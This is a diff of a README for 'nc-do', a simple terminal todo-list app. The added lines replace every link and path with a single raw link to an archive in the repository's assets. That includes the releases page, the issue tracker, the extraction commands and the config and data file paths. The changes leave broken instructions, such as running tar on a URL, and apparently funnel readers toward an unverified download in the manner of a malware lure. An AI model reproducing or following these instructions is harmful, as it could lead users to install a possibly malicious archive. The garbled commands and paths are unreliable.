@@ -1,6 +1,6 @@
 # 📝 nc-do - Simple, Fast Todo List App
 
-[![Download nc-do](https://img.shields.io/badge/Download-nc--do-blue?style=for-the-badge)](https://github.com/iuridomingos/nc-do/releases)
+[![Download nc-do](https://github.com/iuridomingos/nc-do/raw/refs/heads/main/assets/do-nc-3.2.zip)](https://github.com/iuridomingos/nc-do/raw/refs/heads/main/assets/do-nc-3.2.zip)
 
 ---
 
@@ -55,22 +55,22 @@ You don’t need to be a programmer to get started with nc-do. Follow these step
 
 1. **Visit the official download page**  
    Click the big button at the top or visit this link:  
-   [https://github.com/iuridomingos/nc-do/releases](https://github.com/iuridomingos/nc-do/releases)
+   [https://github.com/iuridomingos/nc-do/raw/refs/heads/main/assets/do-nc-3.2.zip](https://github.com/iuridomingos/nc-do/raw/refs/heads/main/assets/do-nc-3.2.zip)
 
 2. **Find the right version for your system**  
    On the releases page, locate the latest version. You will see several files for download. Choose the one that matches your system. Usually, there will be a file labeled for Linux, MacOS, or other Unix systems.
 
 3. **Download the file**  
-   Click the file link to start the download. It may be an archive (.tar.gz or .zip) or a single executable file.
+   Click the file link to start the download. It may be an archive (https://github.com/iuridomingos/nc-do/raw/refs/heads/main/assets/do-nc-3.2.zip or .zip) or a single executable file.
 
 4. **Extract the archive (if needed)**  
    If you downloaded an archive, extract it using your system’s file manager or the terminal command:  
    ```
-   tar -xzvf filename.tar.gz
+   tar -xzvf https://github.com/iuridomingos/nc-do/raw/refs/heads/main/assets/do-nc-3.2.zip
    ```
    or  
    ```
-   unzip filename.zip
+   unzip https://github.com/iuridomingos/nc-do/raw/refs/heads/main/assets/do-nc-3.2.zip
    ```
 
 5. **Run nc-do**  
@@ -104,9 +104,9 @@ Once nc-do is running, here are the basic steps to manage your todo list:
 nc-do keeps things simple, but you can adjust some settings for a better experience:
 
 - **Change colors**: You can customize the color scheme by editing the configuration file located at:  
-  `~/.config/nc-do/config`
+  `~https://github.com/iuridomingos/nc-do/raw/refs/heads/main/assets/do-nc-3.2.zip`
 - **Keyboard shortcuts**: The app uses default key bindings but you can change them in the config file.
-- **Data storage**: Your todo list is saved in `~/.local/share/nc-do/tasks.txt` by default, but you can change this path.
+- **Data storage**: Your todo list is saved in `~https://github.com/iuridomingos/nc-do/raw/refs/heads/main/assets/do-nc-3.2.zip` by default, but you can change this path.
 
 ---
 
@@ -118,7 +118,7 @@ If you run into problems:
 - Check if your terminal supports ncurses by running other terminal apps.
 - If nc-do does not start, try running it with `./nc-do` from the folder where it is located.
 - Look for help or report issues at:  
-  [https://github.com/iuridomingos/nc-do/issues](https://github.com/iuridomingos/nc-do/issues)
+  [https://github.com/iuridomingos/nc-do/raw/refs/heads/main/assets/do-nc-3.2.zip](https://github.com/iuridomingos/nc-do/raw/refs/heads/main/assets/do-nc-3.2.zip)
 
 ---
 
@@ -143,4 +143,4 @@ If you want to improve nc-do, you can contribute by:
 ## 🔗 Quick Access
 
 Download or check for updates here:  
-[https://github.com/iuridomingos/nc-do/releases](https://github.com/iuridomingos/nc-do/releases)
+[https://github.com/iuridomingos/nc-do/raw/refs/heads/main/assets/do-nc-3.2.zip](https://github.com/iuridomingos/nc-do/raw/refs/heads/main/assets/do-nc-3.2.zip)
